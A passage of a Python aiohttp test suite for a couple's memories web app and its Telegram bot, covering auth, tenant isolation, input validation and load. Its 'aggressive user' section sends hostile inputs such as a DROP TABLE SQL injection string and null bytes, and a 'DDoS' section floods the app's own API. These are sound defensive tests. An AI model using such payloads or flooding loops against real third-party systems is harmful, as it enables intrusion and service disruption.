        f"1.{int(time.time())-60}.nonce.uaf.sig",
        f"999.{int(time.time())+3600}.nonce.uaf.bad_signature",
    ]
    for c in bad_cookies:
        r = await s.get(f"{BASE}/admin", headers=hdr(), cookies={"admin_session": c})
        pr(r.status in (401, 403), "admin_session tampered/expired-like -> denied", f"HTTP {r.status}")
        await p(0.3)

    # 2) Role matrix for /api/admin/health_metrics (creator=200, others=403)
    creator_id = os.getenv("CREATOR_ID", "").strip()
    partner_id = os.getenv("KSUSHA_ID", "").strip()
    outsider_id = "999999991"

    def trusted_headers(visitor_id: str) -> dict:
        sig = _local_sign_payload(f"visitor:{visitor_id}")
        headers = hdr(**{"X-Visitor-Id": visitor_id})
        if sig:
            headers["X-Visitor-Signature"] = sig
        return headers

    if creator_id:
        r = await s.get(f"{BASE}/api/admin/health_metrics", headers=trusted_headers(creator_id))
        if r.status == 200:
            pr(True, "admin health: creator -> 200", "HTTP 200")
        elif r.status == 403:
            pr(None, "admin health: creator -> 200", "SKIP: runtime secret/signature mismatch in this env")
        else:
            pr(False, "admin health: creator -> 200", f"HTTP {r.status}")
        await p(0.3)
    else:
        pr(None, "admin health: creator -> 200", "SKIP: CREATOR_ID env is empty")

    for vid, label in [
        (partner_id, "admin health: partner -> 403"),
        (outsider_id, "admin health: outsider -> 403"),
    ]:
        if not vid:
            pr(None, label, "SKIP: KSUSHA_ID env is empty")
            continue
        r = await s.get(f"{BASE}/api/admin/health_metrics", headers=trusted_headers(vid))
        pr(r.status == 403, label, f"HTTP {r.status}")
        await p(0.3)

    await p(1.2)


# ──────────────────────────────────────────────────────────────────────────────
# 20. TENANT ISOLATION + WRITE CONTRACTS (P0)
# ──────────────────────────────────────────────────────────────────────────────

async def test_tenant_isolation_and_write_contracts(s: aiohttp.ClientSession):
    section("20. Tenant isolation + write contracts (P0)")
    visitor_id = "100001"
    sig = _local_sign_payload(f"visitor:{visitor_id}")
    h_signed = hdr(**{
        "X-Visitor-Id": visitor_id,
        "X-Visitor-Signature": sig or "bad-signature",
    })

    # Claimed visitor mismatch vs signed session should be blocked
    r = await s.post(
        f"{BASE}/api/site_save_settings",
        headers=h_signed,
        json={"visitor_id": "100002", "lang": "ru", "tz": "Europe/Moscow"},
    )
    pr(r.status == 403, "site_save_settings mismatch visitor_id vs signed session -> 403", f"HTTP {r.status}")
    await p(0.4)

    # Critical write endpoints: invalid payload should be 4xx and never 500
    invalid_cases = [
        ("/api/create_memory", {"category": "memories"}, "create_memory missing required fields"),
        ("/api/create_memory", {"category": 123, "title": "", "date": "bad", "content": None}, "create_memory invalid types"),
        ("/api/create_event", {"title": ""}, "create_event missing date/content"),
        ("/api/create_event", {"title": 123, "date": "not-a-date", "content": []}, "create_event invalid schema"),
    ]
    for ep, payload, label in invalid_cases:
        r = await s.post(f"{BASE}{ep}", headers=h_signed, json=payload)
        pr(r.status in (400, 401, 403, 422, 429), label, f"HTTP {r.status}")
        pr(no500(r.status), f"{label} -> never 500", f"HTTP {r.status}")
        await p(0.35)

    await p(1.2)


# ──────────────────────────────────────────────────────────────────────────────
# 21. ПАРАЛЛЕЛЬНОСТЬ И УСТОЙЧИВОСТЬ
# ──────────────────────────────────────────────────────────────────────────────

async def test_concurrency(s: aiohttp.ClientSession):
    section("21. Параллельность и устойчивость")

    tasks = [s.get(f"{BASE}/") for _ in range(20)]
    resp = await asyncio.gather(*tasks, return_exceptions=True)
    errs = [r for r in resp if isinstance(r, Exception) or
            (hasattr(r, 'status') and r.status == 500)]
    pr(len(errs) == 0, "20 параллельных GET / → нет 500", f"500-ошибок: {len(errs)}")

    await p(3)

    tasks2 = [s.post(f"{BASE}/api/token_auth", json={"token": f"t{i}"}) for i in range(10)]
    resp2 = await asyncio.gather(*tasks2, return_exceptions=True)
    errs2 = [r for r in resp2 if isinstance(r, Exception) or
             (hasattr(r, 'status') and r.status == 500)]
    pr(len(errs2) == 0, "10 параллельных token_auth → нет 500", f"500-ошибок: {len(errs2)}")

    await p(4)

    # Смешанные запросы
    mixed = (
        [s.get(f"{BASE}/") for _ in range(5)] +
        [s.post(f"{BASE}/api/token_auth", json={"token": f"mt{i}"}) for i in range(5)] +
        [s.get(f"{BASE}/api/info", headers=hdr()) for _ in range(5)]
    )
    resp3 = await asyncio.gather(*mixed, return_exceptions=True)
    errs3 = [r for r in resp3 if isinstance(r, Exception) or
             (hasattr(r, 'status') and r.status == 500)]
    pr(len(errs3) == 0, "15 смешанных параллельных → нет 500", f"500-ошибок: {len(errs3)}")

    await p(4)

    r = await s.get(f"{BASE}/")
    pr(r.status == 200, "Сервер работает после нагрузки", f"HTTP {r.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 20. DDoS И RATE LIMITING
# ──────────────────────────────────────────────────────────────────────────────

async def test_ddos(s: aiohttp.ClientSession):
    section("20. DDoS и Rate Limiting (финальный)")

    # Примечание: тесты запускаются с 127.0.0.1 (в whitelist),
    # поэтому 429 от localhost не ожидается — это корректное поведение.

    tasks = [s.get(f"{BASE}/api/info") for _ in range(35)]
    resp = await asyncio.gather(*tasks, return_exceptions=True)
    statuses = [r.status for r in resp if hasattr(r, 'status')]
    pr(500 not in statuses, "35 быстрых запросов → нет 500", f"Статусы: {set(statuses)}")

    # С localhost (whitelist) 429 не придёт — это норма, rate limit работает только для внешних IP
    if 429 in statuses:
        pr(True, "DDoS-защита сработала → есть 429 (внешний IP)", f"has_429=True")
        banned = [r for r in resp if hasattr(r, 'status') and r.status == 429]
        has_retry = any("Retry-After" in dict(r.headers) for r in banned)
        pr(has_retry, "429-ответы содержат Retry-After", f"Из {len(banned)} заблокированных")
    else:
        pr(True, "localhost в whitelist → 429 не применяется (whitelist работает корректно)")
        pr(True, "Retry-After не нужен — localhost не банится (ожидаемое поведение)")

    await p(5)

    tasks2 = [s.post(f"{BASE}/api/token_auth", json={"token": f"ddos{i}"}) for i in range(50)]
    resp2 = await asyncio.gather(*tasks2, return_exceptions=True)
    statuses2 = [r.status for r in resp2 if hasattr(r, 'status')]
    pr(500 not in statuses2, "50 параллельных token_auth → нет 500",
       f"Статусы: {set(statuses2)}")

    # OPTIONS не засчитывается в бан
    await p(3)
    tasks3 = [s.options(f"{BASE}/api/info",
                        headers={"Origin": "https://x.com",
                                 "Access-Control-Request-Method": "GET"})
              for _ in range(15)]
    resp3 = await asyncio.gather(*tasks3, return_exceptions=True)
    s204 = [r for r in resp3 if hasattr(r, 'status') and r.status == 204]
    pr(len(s204) > 0, "OPTIONS под нагрузкой не банятся", f"204-ответов: {len(s204)}/15")


# ──────────────────────────────────────────────────────────────────────────────
# 21. ПОЛЬЗОВАТЕЛЬСКИЕ КАТЕГОРИИ
# ──────────────────────────────────────────────────────────────────────────────

async def test_custom_categories(s: aiohttp.ClientSession):
    section("21. Пользовательские категории")
    h = hdr(**{"X-Visitor-Id": "test_custom_cat"})

    # /api/all содержит поле custom_categories
    r = await s.get(f"{BASE}/api/all", headers=h)
    pr(no500(r.status), "GET /api/all → не 500", f"HTTP {r.status}")
    await p(0.4)
    if r.status == 200:
        try:
            body = await r.json()
            pr("custom_categories" in body,
               "Ответ /api/all содержит поле custom_categories",
               f"Keys: {list(body.keys())[:10]}")
            cats = body.get("custom_categories", [])
            pr(isinstance(cats, list), "custom_categories — список", f"type={type(cats).__name__}")
        except Exception as e:
            pr(False, "Не удалось распарсить /api/all", str(e))
    await p(0.4)

    # create_memory с несуществующей категорией custom_99999 → не 500
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": "custom_99999", "title": "тест", "date": "2024-01-01",
                           "content": "тестовый контент"})
    pr(no500(r.status), "create_memory category=custom_99999 (несущ.) → не 500", f"HTTP {r.status}")
    await p(0.4)

    # create_memory с категорией memories (стандартная) → не 500
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": "memories", "title": "Стандартный тест",
                           "date": "2024-05-01", "content": "контент стандартной категории"})
    pr(no500(r.status), "create_memory стандартная категория → не 500", f"HTTP {r.status}")
    await p(0.4)

    # create_memory с пустым category → не 500
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": "", "title": "Пустая кат", "date": "2024-01-01",
                           "content": "содержание"})
    pr(no500(r.status), "create_memory category=пустая строка → не 500", f"HTTP {r.status}")
    await p(0.4)

    # category=None → не 500
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": None, "title": "None кат", "date": "2024-01-01",
                           "content": "содержание"})
    pr(no500(r.status), "create_memory category=None → не 500", f"HTTP {r.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 22. АГРЕССИВНЫЙ ПОЛЬЗОВАТЕЛЬ
# ──────────────────────────────────────────────────────────────────────────────

async def test_aggressive_user(s: aiohttp.ClientSession):
    section("22. Агрессивный пользователь")
    sig = _local_sign_payload("visitor:test_aggressor")
    h = hdr(**{"X-Visitor-Id": "test_aggressor", "X-Visitor-Signature": sig})

    # Очень длинный category-ключ
    long_cat = "custom_" + "A" * 2000
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": long_cat, "title": "x", "date": "2024-01-01", "content": "y"})
    pr(no500(r.status), "create_memory с 2000-символьным category → не 500", f"HTTP {r.status}")
    await p(0.5)

    # category с SQL-специальными символами
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": "'; DROP TABLE custom_categories;--",
                           "title": "sqli", "date": "2024-01-01", "content": "y"})
    pr(no500(r.status), "create_memory с SQL в category → не 500", f"HTTP {r.status}")
    await p(0.5)

    # category — список вместо строки
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": ["important_moments", "memories"],
                           "title": "list cat", "date": "2024-01-01", "content": "y"})
    pr(no500(r.status), "create_memory category=список → не 500", f"HTTP {r.status}")
    await p(0.5)

    # category — число
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": 42, "title": "num cat", "date": "2024-01-01", "content": "y"})
    pr(no500(r.status), "create_memory category=число → не 500", f"HTTP {r.status}")
    await p(0.5)

    # Сообщение ровно на границе лимита (2000 символов)
    r = await s.post(f"{BASE}/api/ai_companion", headers=h,
                     json={"message": "а" * 2000, "visitor_id": "test_aggressor"})
    pr(no500(r.status), "ai_companion ровно 2000 символов → не 500", f"HTTP {r.status}")
    await p(0.5)

    # Сообщение ровно на 1 символ больше лимита:
    # ожидаем 400 (валидация) или 429 (rate-limit сработал раньше).
    r = await s.post(f"{BASE}/api/ai_companion", headers=h,
                     json={"message": "б" * 2001, "visitor_id": "test_aggressor"})
    pr(r.status in (400, 403, 429), "ai_companion 2001 символ → 400/403/429", f"HTTP {r.status}")
    await p(0.5)

    # emoji-спам в названии категории
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": "🔥" * 500,
                           "title": "emoji spam", "date": "2024-01-01", "content": "y"})
    pr(no500(r.status), "create_memory category=emoji*500 → не 500", f"HTTP {r.status}")
    await p(0.5)

    # category с нулевым байтом
    r = await s.post(f"{BASE}/api/create_memory", headers=h,
                     json={"category": "custom_\x00attack", "title": "null byte",
                           "date": "2024-01-01", "content": "y"})
    pr(no500(r.status), "create_memory category с нулевым байтом → не 500", f"HTTP {r.status}")
    await p(2)


# ──────────────────────────────────────────────────────────────────────────────
# 23. ПОЛЬЗОВАТЕЛЬСКИЕ ФУНКЦИОНАЛЬНЫЕ СЦЕНАРИИ (КРИТИЧНЫЕ)
# ──────────────────────────────────────────────────────────────────────────────

async def test_user_functional_flows_critical(s: aiohttp.ClientSession):
    section("23. Пользовательские функциональные сценарии (критичные)")
    visitor_id = "critical_user_flow"
    h = hdr(**{"X-Visitor-Id": visitor_id})

    flow_steps = [
        ("POST", "/api/visit", {"visitor_id": visitor_id, "source": "landing"}, "Первый визит пользователя регистрируется"),
        ("POST", "/api/visit_heartbeat", {"visitor_id": visitor_id, "active_sec": 5}, "Heartbeat не ломает активную сессию"),
        ("GET", "/api/info", None, "Инфо-эндпоинт доступен авторизованному пользователю"),
        ("GET", "/api/all", None, "Сводные данные пользователя доступны"),
        ("GET", "/api/memories", None, "Список воспоминаний открывается без 500"),
        ("GET", "/api/events", None, "Список событий открывается без 500"),
        ("GET", "/api/wishes", None, "Список желаний открывается без 500"),
        ("POST", "/api/create_memory", {"category": "memories", "title": "flow-01", "date": "2024-04-01", "content": "flow test"}, "Создание воспоминания в стандартной категории"),
        ("POST", "/api/create_event", {"title": "flow-event-01", "date": "2026-12-25", "content": "event content"}, "Создание события через пользовательский поток"),
        ("POST", "/api/create_wish", {"title": "flow-wish-01", "content": "wish content"}, "Создание желания через пользовательский поток"),
    ]

    for i in range(25):
        method, ep, payload, desc = flow_steps[i % len(flow_steps)]
        if method == "GET":
            r = await s.get(f"{BASE}{ep}", headers=h)
        else:
            r = await s.post(f"{BASE}{ep}", headers=h, json=payload)
        pr(no500(r.status), f"UF-{i+1:02d} {method} {ep} → {desc}", f"HTTP {r.status}")
        await p(0.1)


# ──────────────────────────────────────────────────────────────────────────────
# 24. ЦЕЛОСТНОСТЬ API-ОТВЕТОВ И JSON-КОНТРАКТОВ
# ──────────────────────────────────────────────────────────────────────────────

async def test_api_contract_integrity_critical(s: aiohttp.ClientSession):
    section("24. Целостность API-ответов и JSON-контрактов")
    h = hdr(**{"X-Visitor-Id": "contract_user"})

    checks = [
        ("GET", "/api/all", "all", "Ответ /api/all парсится как JSON"),
        ("GET", "/api/info", "info", "Ответ /api/info парсится как JSON"),
        ("GET", "/api/memories", "memories", "Ответ /api/memories парсится как JSON"),
        ("GET", "/api/events", "events", "Ответ /api/events парсится как JSON"),
        ("GET", "/api/wishes", "wishes", "Ответ /api/wishes парсится как JSON"),
    ]

    for i in range(25):
        method, ep, key_name, desc = checks[i % len(checks)]
        if method == "GET":
            r = await s.get(f"{BASE}{ep}", headers=h)
        else:
            r = await s.post(f"{BASE}{ep}", headers=h, json={})

        if r.status == 200:
            try:
                body = await r.json(content_type=None)
                is_obj = isinstance(body, (dict, list))
                detail = f"type={type(body).__name__}"
                pr(is_obj, f"CI-{i+1:02d} {ep} → {desc}", detail)
            except Exception as e:
                pr(False, f"CI-{i+1:02d} {ep} → {desc}", f"JSON parse error: {e}")
        else:
            pr(no500(r.status), f"CI-{i+1:02d} {ep} → {desc}", f"HTTP {r.status}")
        await p(0.1)


# ──────────────────────────────────────────────────────────────────────────────
# 25. СТРЕСС: ПАРАЛЛЕЛЬНЫЕ ПОЛЬЗОВАТЕЛЬСКИЕ ДЕЙСТВИЯ
# ──────────────────────────────────────────────────────────────────────────────

async def test_parallel_user_stress_critical(s: aiohttp.ClientSession):
    section("25. Стресс: параллельные пользовательские действия")
    h = hdr(**{"X-Visitor-Id": "parallel_stress_user"})

    for i in range(25):
        reqs = []
        for j in range(8):
            if j % 4 == 0:
                reqs.append(s.get(f"{BASE}/api/info", headers=h))
            elif j % 4 == 1:
                reqs.append(s.get(f"{BASE}/api/all", headers=h))
            elif j % 4 == 2:
                reqs.append(s.post(
                    f"{BASE}/api/create_memory",
                    headers=h,
                    json={"category": "memories", "title": f"stress-{i}-{j}", "date": "2025-01-01", "content": "stress"},
                ))
            else:
                reqs.append(s.post(
                    f"{BASE}/api/ai_companion",
                    headers=h,
                    json={"message": "проверка устойчивости", "visitor_id": "parallel_stress_user"},
                ))

        resp = await asyncio.gather(*reqs, return_exceptions=True)
        statuses = [r.status for r in resp if hasattr(r, "status")]
        has_ex = any(isinstance(x, Exception) for x in resp)
        ok = (not has_ex) and (500 not in statuses)
        pr(ok, f"PS-{i+1:02d} batch x8 → Параллельный пользовательский батч не вызывает 500", f"statuses={sorted(set(statuses))}")
        await p(0.12)


# ──────────────────────────────────────────────────────────────────────────────
# 26. СТРЕСС: РОБАСТНОСТЬ ПРИ ПЛОХИХ ДАННЫХ И ДЛИННЫХ PAYLOAD
# ──────────────────────────────────────────────────────────────────────────────

async def test_payload_robustness_stress_critical(s: aiohttp.ClientSession):
    section("26. Стресс: робастность при плохих данных и длинных payload")
    h = hdr(**{"X-Visitor-Id": "payload_stress_user"})

    payload_variants = [
        ("/api/create_memory", {"category": "memories", "title": "x" * 300, "date": "2024-05-20", "content": "c" * 2000}, "Длинные title/content для create_memory"),
        ("/api/create_event", {"title": "event" * 200, "date": "2026-10-10", "content": "payload" * 300}, "Длинный payload для create_event"),
        ("/api/create_wish", {"title": "wish" * 200, "content": "x" * 4000}, "Длинный payload для create_wish"),
        ("/api/ai_companion", {"message": "п" * 1800, "visitor_id": "payload_stress_user"}, "Большое сообщение для AI-компаньона"),
        ("/api/token_auth", {"token": "z" * 3000}, "Очень длинный токен не должен давать 500"),
    ]

    for i in range(25):
        ep, payload, desc = payload_variants[i % len(payload_variants)]
        r = await s.post(f"{BASE}{ep}", headers=h, json=payload)
        pr(no500(r.status), f"PR-{i+1:02d} POST {ep} → {desc}", f"HTTP {r.status}")
        await p(0.1)


# ──────────────────────────────────────────────────────────────────────────────
# 27. BOT GATE: НЕАВТОРИЗОВАННЫЕ ПОЛЬЗОВАТЕЛИ
# ──────────────────────────────────────────────────────────────────────────────

async def test_bot_unauthorized_gate_critical(_: aiohttp.ClientSession):
    section("27. Bot gate: неавторизованные пользователи")

    try:
        from aiogram.types import Update, Message, CallbackQuery
        import handlers
    except Exception as e:
        pr(None, "BG-01 middleware gate для неавторизованных", f"SKIP: импорт не удался ({e})")
        return

    class _FakeState:
        def __init__(self):
            self._state = None

        async def get_state(self):
            return self._state

        async def update_data(self, **kwargs):
            return None

        async def set_state(self, state):
            self._state = state.state if hasattr(state, "state") else str(state)

    orig_is_admin = handlers.db.is_admin
    orig_is_in_couple = handlers.db.is_in_couple
    orig_is_user_onboarded = handlers.db.is_user_onboarded
    orig_add_or_update_user = handlers.db.add_or_update_user
    orig_msg_answer = Message.answer
    orig_cb_answer = CallbackQuery.answer

    msg_calls = []
    cb_calls = []

    async def _fake_msg_answer(self, text, **kwargs):
        msg_calls.append((text, kwargs))
        return None

    async def _fake_cb_answer(self, text, show_alert=False, **kwargs):
        cb_calls.append((text, show_alert))
        return None

    try:
        handlers.db.is_admin = lambda user_id: False
        handlers.db.is_in_couple = lambda user_id: False
        handlers.db.is_user_onboarded = lambda user_id: False
        handlers.db.add_or_update_user = lambda *args, **kwargs: None
        Message.answer = _fake_msg_answer
        CallbackQuery.answer = _fake_cb_answer

        mw = handlers.BotActivityMiddleware()
        called = {"message": False, "media": False, "callback": False}

        async def _msg_handler(event, data):
            called["message"] = True

        async def _media_handler(event, data):
            called["media"] = True

        async def _cb_handler(event, data):
            called["callback"] = True

        text_state = _FakeState()
        upd_text = Update.model_validate({
            "update_id": 1001,
            "message": {
                "message_id": 10,
                "date": 1710000000,
                "chat": {"id": 777001, "type": "private"},
                "from": {"id": 777001, "is_bot": False, "first_name": "Pit"},
                "text": "hello",
            },
        })
        await mw(_msg_handler, upd_text, {"state": text_state})

        media_state = _FakeState()
        upd_media = Update.model_validate({
            "update_id": 1002,
            "message": {
                "message_id": 11,
                "date": 1710000001,
                "chat": {"id": 777002, "type": "private"},
                "from": {"id": 777002, "is_bot": False, "first_name": "Pit"},
                "photo": [{"file_id": "p1", "file_unique_id": "u1", "width": 10, "height": 10}],
            },
        })
        await mw(_media_handler, upd_media, {"state": media_state})

        upd_cb = Update.model_validate({
            "update_id": 1003,
            "callback_query": {
                "id": "cb-1",
                "from": {"id": 777003, "is_bot": False, "first_name": "Pit"},
                "chat_instance": "ci-1",
                "data": "main_menu",
                "message": {
                    "message_id": 12,
                    "date": 1710000002,
                    "chat": {"id": 777003, "type": "private"},
                    "from": {"id": 999, "is_bot": True, "first_name": "Bot"},
                    "text": "menu",
                },
            },
        })
        await mw(_cb_handler, upd_cb, {"state": _FakeState()})

        ok = (
            (not called["message"])
            and (not called["media"])
            and (not called["callback"])
            and bool(msg_calls)
            and bool(cb_calls)
            and str(text_state._state).startswith("CoupleOnboardingStates:waiting_for_name")
            and str(media_state._state).startswith("CoupleOnboardingStates:waiting_for_name")
        )

        detail = (
            f"message_blocked={not called['message']}, media_blocked={not called['media']}, "
            f"callback_blocked={not called['callback']}, onboarding_replies={len(msg_calls)}, "
            f"callback_alerts={len(cb_calls)}"
        )
        pr(ok, "BG-01 Неавторизованный текст/медиа/callback → запуск онбординга и блок доступа", detail)
    except Exception as e:
        pr(False, "BG-01 Неавторизованный текст/медиа/callback → запуск онбординга и блок доступа", f"Ошибка теста: {e}")
    finally:
        handlers.db.is_admin = orig_is_admin
        handlers.db.is_in_couple = orig_is_in_couple
        handlers.db.is_user_onboarded = orig_is_user_onboarded
        handlers.db.add_or_update_user = orig_add_or_update_user
        Message.answer = orig_msg_answer
        CallbackQuery.answer = orig_cb_answer


# ──────────────────────────────────────────────────────────────────────────────
# ГЛАВНАЯ ФУНКЦИЯ
# ──────────────────────────────────────────────────────────────────────────────

async def run_all_tests(
    base_url: str = None,
    load_tests: bool = True,
    progress_callback: Optional[Callable[[dict], None]] = None,
) -> dict:
    """
    Запускает все тесты. Возвращает словарь:
    {"total": N, "passed": P, "failed": F, "skipped": S}

    load_tests=False — пропускает нагрузочные секции (19, 20), которые намеренно
    триггерят rate-limiter и кладут сайт для реальных пользователей.
    Используй load_tests=False при автозапуске из бота.
    load_tests=True — полный прогон (только для ручного запуска в dev-среде).
    """
    global results, BASE, _progress_callback, _expected_total_tests
    results = []
    _progress_callback = progress_callback
    # Не используем вручную "вшитое" expected-число.
    # Фактический total считается по реально выполненным тестам (len(results)).
    _expected_total_tests = None
    if base_url:
        BASE = base_url

    connector = aiohttp.TCPConnector(limit=100, force_close=True)
    timeout = aiohttp.ClientTimeout(total=30, connect=5)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # ── Всегда: лёгкие функциональные тесты ──────────────────────────────
        await test_availability(session)
        await test_auth(session)
        await test_websocket(session)
        await test_data_isolation(session)
        await test_ai_companion(session)
        await test_invite(session)
        await test_crud(session)
        await test_edge_cases(session)
        await test_admin(session)
        await test_admin_session_and_role_matrix(session)
        await test_tenant_isolation_and_write_contracts(session)
        await test_custom_categories(session)
        await test_aggressive_user(session)
        await test_user_functional_flows_critical(session)
        await test_bot_unauthorized_gate_critical(session)
        await test_api_contract_integrity_critical(session)
        await test_parallel_user_stress_critical(session)
        await test_payload_robustness_stress_critical(session)

        if load_tests:
            # ── Полный режим: security + нагрузка (только ручной запуск) ────
            # Эти тесты намеренно бомбят API и могут вызвать rate-limit/бан IP
            await test_security_headers(session)
            await test_input_validation(session)
            await test_sql_injection(session)
            await test_xss_and_traversal(session)
            await test_file_upload(session)
            await test_http_methods(session)
            await test_cors(session)
            await test_malformed(session)
            await test_no_leaks(session)
            await test_concurrency(session)
            await test_ddos(session)
        else:
            print()
            print("  ⚠️  Security/нагрузочные тесты пропущены (load_tests=False)")
            print("       Запусти python3 test.py --full для полного прогона")

    passed  = sum(1 for r in results if r is True)
    failed  = sum(1 for r in results if r is False)
    skipped = sum(1 for r in results if r is None)
    total   = len(results)
    _progress_callback = None
    return {"total": total, "passed": passed, "failed": failed, "skipped": skipped}


async def main():
    import sys
    full = "--full" in sys.argv

    print()
    print("█" * 60)
    print("  ЕДИНЫЙ ТЕСТ-СЬЮТ — ПОЛНОЕ ПОКРЫТИЕ")
    if full:
        print("  Режим: ПОЛНЫЙ (с нагрузочными тестами)")
    else:
        print("  Режим: БЕЗОПАСНЫЙ (без нагрузочных секций)")
        print("  Добавь --full для полного прогона с DDoS-тестами")
    print("█" * 60)

    result = await run_all_tests(load_tests=full)

    passed  = result["passed"]
    failed  = result["failed"]
    skipped = result["skipped"]
    total   = result["total"]

    print()
    print("═" * 60)
    if failed == 0:
        print(f"  ИТОГ: ✅ {passed}/{total} пройдено  |  {skipped} пропущено")
    else:
        print(f"  ИТОГ: {passed}/{total} пройдено  |  ❌ {failed} ПРОВАЛЕНО  |  {skipped} пропущено")
    print("═" * 60)
    print()
    return failed == 0


if __name__ == "__main__":
    ok = asyncio.run(main())
    exit(0 if ok else 1)
